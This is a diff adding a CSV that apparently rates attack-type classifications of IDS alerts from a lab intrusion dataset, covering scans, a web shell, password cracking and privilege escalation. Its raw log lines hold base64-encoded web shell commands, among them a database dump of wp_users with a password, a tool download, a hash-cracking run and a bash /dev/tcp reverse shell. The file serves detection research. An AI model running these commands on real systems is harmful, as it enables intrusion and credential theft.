@@ -1,0 +1,142 @@
+AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
+DNSteal;6;"Command and Control, 
+Exfiltration";"IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,
+Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”, “dnsmasq[14460]: forwarded youtu.be to [IP]”";Classification probably based on dnsmasq and high entropy in DNS domain;Correct & expressive
+DNSteal;1;"Reconnaissance, 
+Discovery";"IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”
+Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]”";Classification probably based on dnsmasq and high frequency of query records;Too generic
+Service Scans;3;"Brute Force,
+Credential Access";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.130.77, lip=192.168.128.195, session=<hifuP9rVVNbAqIJN>”";Classification probably based on login attempts without auth attempts;Alternate explanation for alert
+Service Scans;2;"Application Access Attempt,
+Web Attack: Directory Traversal Attempt";"IDS: “New event type.”,  “New path(es) detected”, 
+Raw Data: “AH01630: client denied by server configuration: /var/www/html/”";Classification probably based on  repeated unsuccessful access to web root directory;Alternate explanation for alert
+Service Scans;1;"Network Scan,
+Enumeration";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “TLS error on connection from [IP] (gnutls_handshake): An unexpected TLS packet was received.”";Classification probably based on protocol TLS and potential malformed TLS packet;Correct & expressive
+Service Scans;2;"Network Scan,
+Web Application Attack,
+Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”";Classification probably based on tool name nmap;Correct & expressive
+Service Scans;1;"Network Scan,
+Web Application Attack,
+Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET / HTTP/1.0 403 363 - - ”";Classification probably based on tool name apache and http status code 403;Correct & expressive
+Service Scans;2;"Vulnerability Scanning, 
+Reconnaissance";"IDS: “New status code in Apache Access log.”, “New value(s) detected”, 
+Raw Data: “POST /sdk HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”";Classification probably based on tool name nmap and 403 status code;Correct & expressive
+Service Scans;5;"Reconnaissance,
+Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”, 
+Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1”";Classification probably based on attempted access to known web application paths;Correct & expressive
+WPScan;1;"Vulnerability Scanning,
+Reconnaissance";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name apache and http status code 403;Correct & expressive
+WPScan;12;"Vulnerability Scanning, 
+Reconnaissance";"IDS: “New request method in Apache Access log.”, “New value(s) detected” 
+Raw Data: “HEAD /wp-content/plugins/analytics-for-wp/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and 404 error code;Correct & expressive
+WPScan;2;"Vulnerability Scanning,
+Information Gathering";"IDS: “New request method in Apache Access log.”, “New value(s) detected”,
+Raw Data: “HEAD /wp-content/themes/eCobiz/timthumb.php HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and 404 error code;Correct & expressive
+Dirb;2;"Information Gathering,
+Discovery";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /javascript/jquery/.htpasswd_ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on tool name apache and http status code 403;Too generic
+Dirb;4;"Information Gathering, 
+Discovery";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
+Raw Data: “GET /javascript/jquery/@ HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Too generic
+Dirb;2;"Information Gathering,
+Discovery";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat”";Classification probably based on attempted access to non-existent php script;Too generic
+Dirb;3;"Path Traversal,
+Information Gathering";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
+Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)’”";Classification probably based on special characters and http status code 404;Correct & expressive
+Dirb;1;"Information Gathering,
+Directory Traversal";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”";Classification probably based on attempted access to directory without index file;Correct & expressive
+Dirb;1;"Information Gathering,
+Defense Evasion";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”";Classification probably based on attempted access to sensitive config or access control file;Too generic
+Dirb;4;"Information Gathering,
+Reconnaissance";"IDS: ”New status code in Apache Access log.”, ""New value(s) detected"",
+Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on http status code 301 (Moved Permanently) and tool name Apache;Too generic
+Dirb;2;"Web Server Compromise,
+Information Gathering";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to php config file;Too generic
+Dirb;2;"Information Gathering,
+Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”";Classification probably based on attempted access to php config file;Correct & expressive
+Dirb;1;"Web Application Attack,
+Directory Traversal";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on tool name apache and http status code 403;Correct & expressive
+Dirb;5;"Information Gathering,
+Path Traversal";"IDS: “New characters in Apache Access request.”, “New character(s) detected”, 
+Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Correct & expressive
+Dirb;1;"Information Gathering,
+Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”";Classification probably based on attempted access to .php file in WordPress themes directory;Correct & expressive
+Dirb;1;"Information Gathering,
+Exploitation for Client Execution";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to .php file in WordPress themes directory;Too generic
+Dirb;4;"Information Gathering,
+Web Content Discovery";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
+Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Too generic
+Dirb;2;"Information Gathering,
+Web Content Discovery";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on http status code 403 and attempted access to WordPress themes directory and sensitive files;Too generic
+Dirb;2;"Information Gathering,
+Credential Access";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
+Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on http status code 403 and attempted access to WordPress themes directory and sensitive files;Alternate explanation for alert
+Dirb;1;"Information Gathering,
+Web Content Discovery";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”";Classification probably based on attempted access to sensitive file in WordPress themes directory ;Too generic
+Dirb;3;"Information Gathering,
+Web Attack: Directory Traversal";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”";Classification probably based on attempted access to sensitive file in WordPress themes directory ;Correct & expressive
+Dirb;2;"Information Gathering,
+Web Attack: Path Traversal";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”";Classification probably based on attempted access to sensitive file in WordPress themes directory ;Correct & expressive
+Web Shell;1;"Web Shell,
+Command and Control,
+Exfiltration,
+Credential Access";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
+Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload including keywords such as mysql, select;Correct & expressive
+Web Shell;1;"Web Shell,
+Command and Control,
+Defense Evasion, 
+Inhibit Response Function";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
+Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload including keywords such as wget, GitHub URL;Correct & expressive
+Password Cracking;1;"Web Shell, 
+Credential Access,
+Brute Force,
+Lateral Movement";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, 
+Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload including keywords such as wphashcrack, rockyou.txt;Correct & expressive
+Password Cracking;1;"Information Gathering,
+Reconnaissance";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”
+Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”";Classification probably based on unusual occurrence frequencies of apache access request and standard user agent;Too generic
+Password Cracking;1;"Resource Hijacking, 
+Denial of Service, 
+Impact";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification probably based on unusual increase in CPU usage;Alternate explanation for alert
+Password Cracking;1;DNS Reconnaissance;"IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”
+Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification probably based on unusual frequency of DNS queries from different internal Ips;Alternate explanation for alert
+Password Cracking;1;Web Server Reconnaissance;"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”
+Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”";Classification probably based on unusual frequency of apache request methods;Too generic
+Reverse Shell;1;"Command and Control,
+Web Shell, 
+Indicator Removal on Host";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
+Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload including attempted command execution and file deletion;Correct & expressive
+Privilege Escalation;1;"Privilege Escalation,
+Account Manipulation";"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
+Privilege Escalation;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
+Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”";Classification probably based on tool name su;Correct & expressive
+Privilege Escalation;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”
+Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su and pam;Correct & expressive
+Privilege Escalation;1;"Privilege Escalation, 
+Authentication Bypass";"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”,
+Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
+Privilege Escalation;1;Privilege Escalation;"IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”,
+Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
+Privilege Escalation;1;Credential Access;"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”,
+Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Alternate explanation for alert
+Privilege Escalation;1;Privilege Escalation;"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”,
+Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
+;96;;;;
